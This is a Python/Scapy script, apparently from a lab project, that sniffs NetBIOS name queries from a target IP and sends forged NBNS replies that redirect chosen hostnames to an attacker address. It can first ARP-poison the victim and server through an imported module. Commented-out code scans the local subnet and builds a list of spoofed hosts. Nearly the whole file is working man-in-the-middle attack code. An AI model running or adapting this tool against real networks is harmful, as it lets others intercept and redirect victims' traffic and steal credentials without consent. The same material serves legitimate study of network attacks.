from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
import arpSpoof


class Dns():

    def __init__(self,networkInterface, victimIP, serverIP, spoofedWebsites):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofedWebsites = spoofedWebsites
        self.serverIP = serverIP


    def startSniffing(self):
        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=20)


    def sendFakeResponse(self, pkt):
        if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == self.victimIP:
            print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being requested.")
            print(len(pkt[NBNSQueryRequest].QUESTION_NAME), [len(key) for key in self.spoofedWebsites.keys()])
            if pkt[NBNSQueryRequest].QUESTION_NAME in self.spoofedWebsites.keys():
                print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being redirected to " + self.spoofedWebsites.get(pkt[NBNSQueryRequest].QUESTION_NAME))
                etherLayer = Ether(src=get_if_hwaddr(self.networkInterface), dst=pkt[Ether].src)
                ipLayer = IP(src=pkt[IP].src, dst=pkt[IP].src)
                udpLayer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                nbnsResponse = NBNSQueryResponse(NAME_TRN_ID=pkt[NBNSQueryRequest].NAME_TRN_ID,
                                                 RR_NAME=pkt[NBNSQueryRequest].QUESTION_NAME,
                                                 QDCOUNT=0, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0, NB_ADDRESS=self.spoofedWebsites.get(pkt[NBNSQueryRequest].QUESTION_NAME))
                poisonedPaket = etherLayer / ipLayer / udpLayer / nbnsResponse

                sendp(poisonedPaket, verbose=0, iface=self.networkInterface)

    def spoofARP(self):
            arpSpoof.arpPoisoning(self.victimIP, self.serverIP, self.networkInterface)

    def start(self, mode):
        if mode:
            self.spoofARP()
            self.startSniffing()
        else:
            self.startSniffing()




networkInterface = "enp0s3"
victimIP = "192.168.56.101"
# spoofedWebsites= {"WWW.GOOGLE.COM" : "192.168.56.102"} #when user will input it always add www. infront and make evrything in upper case
spoofedWebsites = {}

#simple terminal interface
# print("Scanning the network .. ")
# ans, unans = srp (Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = "192.168.56.0/24"), timeout = 2, iface = networkInterface, inter = 0.1)
# for arg1, arg2 in ans :
#     print ("IP: {} MAC: {}".format(arg2[ARP].psrc, arg2[ARP].hwsrc))


# print ("Start DNS spoof")
# redirectTo = "192.168.56.102"
#
#
# input = ""
# while input != "stop":
#     input = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
#     if input != "stop":
#         input = input.upper()
#         spoofedWebsites.update({input+"   " : redirectTo})
#         if input[0:4] != "WWW.":
#             spoofedWebsites.update({"WWW."+ input+"   ": redirectTo})
#         else:
#             spoofedWebsites.update({input[4:]+"   ": redirectTo})
#
# print(spoofedWebsites)
# test = Dns(networkInterface, victimIP, spoofedWebsites)
# test.start()